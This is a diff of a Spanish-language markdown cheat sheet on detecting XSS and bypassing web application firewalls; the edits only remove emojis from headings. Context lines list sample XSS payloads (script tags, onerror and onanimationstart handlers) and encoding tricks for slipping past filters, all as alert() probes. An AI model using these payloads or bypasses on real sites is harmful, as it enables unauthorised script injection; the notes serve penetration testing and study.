@@ -1,5 +1,5 @@
 -- -
-#### 📝 **Detección y Bypass de XSS**  
+#### **Detección y Bypass de XSS**  
 ---
 
 ## 🔍 **Fase 1: Reconocimiento**  
@@ -8,7 +8,7 @@
 
 ---
 
-## 🔗 **Fase 2: Inyecciones Básicas (con Tag Cerrado)**  
+## **Fase 2: Inyecciones Básicas (con Tag Cerrado)**  
 ```html
 <script>alert(1)</script>
 <img src="x" onerror="alert('XSS')" />
@@ -21,15 +21,14 @@
 
 ---
 
-## 🗃️ **Fase 3: Bypass de WAF**  
+## **Fase 3: Bypass de WAF**  
 - **HTML Entities**: `&#60;script&#62;`.  
 - **URL Encoding**: `%3Cscript%3E`.  
 - **Hex/Unicode**: `\u003Cscript\u003E`.  
 - **Double Encoding**: `%26%2360%3Bscript%26%2362%3B`.  
 
 ---
-
-## 🛠️ **Algunos payloads**  
+## **Algunos payloads**  
 ```javascript 
 " style="animation-name:swoop-up" onanimationstart="alert(document.domain)
 ```
